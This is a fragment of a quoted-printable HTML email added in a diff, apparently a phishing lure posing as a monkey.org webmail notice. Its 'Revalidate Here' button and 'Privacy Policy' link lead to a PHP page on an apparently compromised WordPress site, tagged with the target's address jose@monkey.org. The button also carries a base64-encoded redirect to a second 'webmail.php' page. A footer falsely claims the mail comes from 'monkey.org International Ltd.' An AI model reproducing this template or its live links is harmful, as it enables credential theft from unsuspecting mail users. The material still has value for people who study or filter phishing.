+<tr>
+<td align=3D"center" style=3D"margin: 0px; background-color: rgb(0, 0, 0);"=
+>
+<a style=3D'padding: 15px 25px; border: 2px solid rgb(0, 0, 0); border-imag=
+e: none; color: rgb(255, 255, 254); line-height: 17px; letter-spacing: norm=
+al; font-family: "DM Sans",sans-serif,-apple-system,BlinkMacSystemFont,"Seg=
+oe UI",Roboto,Helvetica,Arial,sans-serif,"Apple Color Emoji","Segoe UI Emoj=
+i","Segoe UI Symbol"; font-size: 14px; font-style: normal; font-weight: bol=
+d; text-decoration: none; display: block; background-color: transparent;'=
+=20
+href=3D"https://m-melody.jp/wp-includes/rec.php#jose@monkey.org" target=3D"=
+_blank" rel=3D"noreferrer" data-saferedirecturl=3D"https://www.google.com/u=
+rl?q=3Dhttps://vozer.net/go/?to%3DaHR0cHM6Ly9yb3lhbGNvdW50cnlnYXJkZW4uY28ua=
+2Uvd3AtY29udGVudC91cGxvYWRzLzIwMjMvd2VibWFpbC5waHA%23sales@metprotrade.rs&a=
+mp;source=3Dgmail&amp;ust=3D1752728136057000&amp;usg=3DAOvVaw2lUKaF7wZ3aWs_=
+q7ywIPLm"><span style=3D"color: rgb(255, 255, 254); text-decoration: none;"=
+>Revalidate
+Here<br>
+</span></a></td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+<td width=3D"40" style=3D"margin: 0px;"><br>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+<tr>
+<td height=3D"20" style=3D"margin: 0px; line-height: 1px; font-size: 1px;">=
+<br>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+<td width=3D"20" style=3D"margin: 0px; line-height: 1px; font-size: 1px;"><=
+br>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+<table width=3D"100%" align=3D"center" style=3D"border-collapse: collapse;"=
+ bgcolor=3D"#f4f5ff" cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"center" valign=3D"top" style=3D"margin: 0px;">
+<table width=3D"640" style=3D"width: 640px; border-collapse: collapse;" cel=
+lspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td width=3D"20" style=3D"margin: 0px;"><br>
+</td>
+<td align=3D"center" valign=3D"top" style=3D"margin: 0px;">
+<table width=3D"100%" style=3D"border-collapse: collapse;" bgcolor=3D"#f4f5=
+ff" cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td width=3D"30" style=3D"margin: 0px;"><br>
+</td>
+<td align=3D"center" valign=3D"top" style=3D"margin: 0px;">
+<table width=3D"100%" style=3D"color: rgb(0, 0, 0); text-transform: none; l=
+etter-spacing: normal; font-family: Roboto,sans-serif; font-size: 14px; fon=
+t-style: normal; font-weight: 400; word-spacing: 0px; white-space: normal; =
+border-collapse: collapse; background-color: rgb(244, 245, 255);" cellspaci=
+ng=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td height=3D"20" style=3D"margin: 0px; line-height: 1px; font-size: 1px;">=
+<br>
+</td>
+</tr>
+</tbody>
+</table>
+<table width=3D"100%" style=3D"color: rgb(44, 54, 58); text-transform: none=
+; letter-spacing: normal; font-family: Roboto,sans-serif; font-size: 14px; =
+font-style: normal; font-weight: 400; word-spacing: 0px; white-space: norma=
+l; border-collapse: collapse; background-color: rgb(244, 245, 255);" cellsp=
+acing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"left" valign=3D"top" style=3D"margin: 0px;"><br>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+<td width=3D"40" style=3D"margin: 0px;"><br>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+<tr>
+<td height=3D"20" style=3D"margin: 0px; line-height: 1px; font-size: 1px;">=
+<br>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+<td width=3D"20" style=3D"margin: 0px; line-height: 1px; font-size: 1px;"><=
+br>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+<table width=3D"100%" align=3D"center" style=3D"text-align: left; color: rg=
+b(44, 54, 58); text-transform: none; letter-spacing: normal; font-family: R=
+oboto,sans-serif; font-size: 14px; font-style: normal; font-weight: 400; wo=
+rd-spacing: 0px; white-space: normal; border-collapse: collapse; background=
+-color: rgb(250, 250, 250);" bgcolor=3D"#fafafa" cellspacing=3D"0" cellpadd=
+ing=3D"0">
+<tbody>
+<tr>
+<td align=3D"center" valign=3D"top" style=3D"margin: 0px;">
+<table width=3D"640" style=3D"width: 640px; border-collapse: collapse;" cel=
+lspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td width=3D"20" style=3D"margin: 0px;"><br>
+</td>
+<td align=3D"center" valign=3D"top" style=3D"margin: 0px;">
+<table width=3D"100%" style=3D"border-collapse: collapse;" bgcolor=3D"#fafa=
+fa" cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td width=3D"30" style=3D"margin: 0px;"><br>
+</td>
+<td align=3D"center" valign=3D"top" style=3D"margin: 0px;">
+<table width=3D"100%" style=3D"border-collapse: collapse;" cellspacing=3D"0=
+" cellpadding=3D"0">
+<tbody>
+<tr>
+<td height=3D"20" style=3D"margin: 0px; line-height: 1px; font-size: 1px;">=
+<br>
+</td>
+</tr>
+</tbody>
+</table>
+<table width=3D"100%" style=3D"border-collapse: collapse;" cellspacing=3D"0=
+" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"left" valign=3D"top" style=3D"margin: 0px;"><a style=3D"color:=
+ rgb(0, 172, 255); text-decoration: none; background-color: transparent;" r=
+el=3D"noreferrer">
+<img width=3D"147" class=3D"CToWUd" style=3D"width: 147px; height: auto; ve=
+rtical-align: middle; display: block; max-width: 147px;" alt=3D"Webmail" sr=
+c=3D"https://ci3.googleusercontent.com/meips/ADKq_NYV5NrwnV_-Rb7NTuP3XXX3rJ=
+nEsp1bRqHAOebyViyNKAk8cSdXCVBT29ZlODz-MfrPIpH8AUBNRVoN6uukDT6lY2Viwv5IZbSgp=
+Q=3Ds0-d-e1-ft#https://hunterfmradio.com/assets/img/logo/outputs.png" borde=
+r=3D"0" data-bit=3D"iit" height=3D"58"></a></td>
+</tr>
+</tbody>
+</table>
+<table width=3D"100%" style=3D"border-collapse: collapse;" cellspacing=3D"0=
+" cellpadding=3D"0">
+<tbody>
+<tr>
+<td height=3D"10" style=3D"margin: 0px; line-height: 1px; font-size: 1px;">=
+<br>
+</td>
+</tr>
+</tbody>
+</table>
+<table width=3D"100%" style=3D"border-collapse: collapse;" cellspacing=3D"0=
+" cellpadding=3D"0">
+<tbody>
+<tr>
+</tr>
+<tr>
+<td style=3D'margin: 0px; color: rgb(85, 85, 85); line-height: 14px; font-f=
+amily: "DM Sans",sans-serif,-apple-system,BlinkMacSystemFont,"Segoe UI",Rob=
+oto,Helvetica,Arial,sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe =
+UI Symbol"; font-size: 12px; font-weight: 400;'>You
+have received this email because you are registered under monkey.org
+,to ensure the
+implementation of our Terms of Service and (or) for other legitimate
+matters.<br>
+<br>
+</td>
+</tr>
+<tr>
+<td align=3D"left" valign=3D"top" style=3D'margin: 0px; color: rgb(85, 85, =
+85); line-height: 14px; font-family: "DM Sans",sans-serif,-apple-system,Bli=
+nkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif,"Apple Color E=
+moji","Segoe UI Emoji","Segoe UI Symbol"; font-size: 12px; font-weight: 400=
+;'>
+<a style=3D"color: rgb(0, 172, 255); text-decoration: none; background-colo=
+r: transparent;" href=3D"https://m-melody.jp/wp-includes/rec.php#jose@monke=
+y.org" target=3D"_blank" rel=3D"noreferrer" data-saferedirecturl=3D"https:/=
+/www.google.com/url?q=3Dhttps://privacy/?utm_source%3Dcordial%26utm_medium%=
+3Demail%26utm_campaign%3Demail_status_change&amp;source=3Dgmail&amp;ust=3D1=
+752728136057000&amp;usg=3DAOvVaw2SX26LLOAgMiaFSz4_vHSA"><span style=3D"colo=
+r: rgb(85, 85, 85); text-decoration: underline;">Privacy
+Policy</span></a><br>
+<br>
+&copy; 2004&#8211;2025 monkey.org&nbsp; International Ltd.</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+
+
+
+</body></html>
+
